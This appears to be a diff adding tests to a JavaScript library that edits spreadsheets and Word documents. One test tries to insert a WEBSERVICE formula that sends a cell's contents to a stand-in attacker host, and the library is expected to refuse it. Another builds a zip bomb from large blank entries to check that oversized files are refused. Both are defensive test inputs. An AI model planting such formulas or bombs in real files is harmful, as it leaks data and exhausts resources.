@@ -195,6 +195,36 @@ section('formulas');
   check('  though one of those that share it can', !!editWorkbook(workbook(), [{ sheet: 1, cell: 'A6', value: 1 }]).buffer);
 }
 
+section('what the review found');
+{
+  const after = editWorkbook(workbook(), [
+    { sheet: 1, cell: 'A1', value: 'changed' },
+    { sheet: 1, cell: 'K3', value: 'copied', style_from: 'A1' },
+  ]);
+  const xml = partsOf(after.buffer).get('xl/worksheets/sheet1.xml');
+  const styleOf = (ref) => new RegExp(`<c r="${ref}"[^>]*\\bs="(\\d+)"`).exec(xml)?.[1];
+  check('a cell changed earlier in the call can still lend its look', styleOf('A1') != null && styleOf('K3') === styleOf('A1'), `${styleOf('A1')} ${styleOf('K3')}`);
+  let refused = '';
+  try {
+    editWorkbook(workbook(), [{ sheet: 1, cell: 'K4', formula: '=WEBSERVICE("https://evil.example/?d="&A1)' }]);
+  } catch (err) {
+    refused = err.message;
+  }
+  check('a formula that reaches out is not added', /reaches out/.test(refused), refused);
+
+  const bomb = writeZip([
+    ...[...partsOf(workbook())].map(([name, data]) => ({ name, data })),
+    ...Array.from({ length: 6 }, (_, i) => ({ name: `xl/media/huge${i}.bin`, data: Buffer.alloc(60 * 1024 * 1024) })),
+  ]);
+  let tooBig = '';
+  try {
+    editWorkbook(bomb, [{ sheet: 1, cell: 'K5', value: 'x' }]);
+  } catch (err) {
+    tooBig = err.message;
+  }
+  check('a small file that unpacks to a great deal is refused, not held in memory', /unpacks to more/.test(tooBig), tooBig);
+}
+
 section('what is refused, and how');
 {
   check('a sheet that is not there, naming the ones that are', refused(() => editWorkbook(workbook(), [{ sheet: 'Nope', cell: 'A1', value: 1 }]), /no sheet called "Nope".*"DQT - T10", "Hidden data"/));
@@ -272,6 +302,14 @@ section('a Word file: the words named, keeping their look');
   const words = readDocumentWords(file, 'docx');
   check('its words read as they are, ready to be matched', /Báo cáo tháng 9/.test(words) && /Doanh thu tăng 12%/.test(words), words);
   check('nothing it could not be rebuilt from is lost', [...partsOf(file).keys()].every((name) => partsOf(across.buffer).has(name)));
+}
+
+section('"all" with a replacement that holds what it replaces');
+{
+  const file = docx(`<w:p>${run('Báo cáo tháng 9 và tháng 9')}</w:p>`);
+  const all = editDocument(file, 'docx', [{ find: 'tháng 9', replace: 'tháng 9 năm 2026', all: true }]);
+  const text = String(partsOf(all.buffer).get('word/document.xml'));
+  check('changes every one, and leaves no mark behind', (text.match(/tháng 9 năm 2026/g) || []).length === 2 && !text.includes('\uE000'), text.slice(-200));
 }
 
 section('a deck');
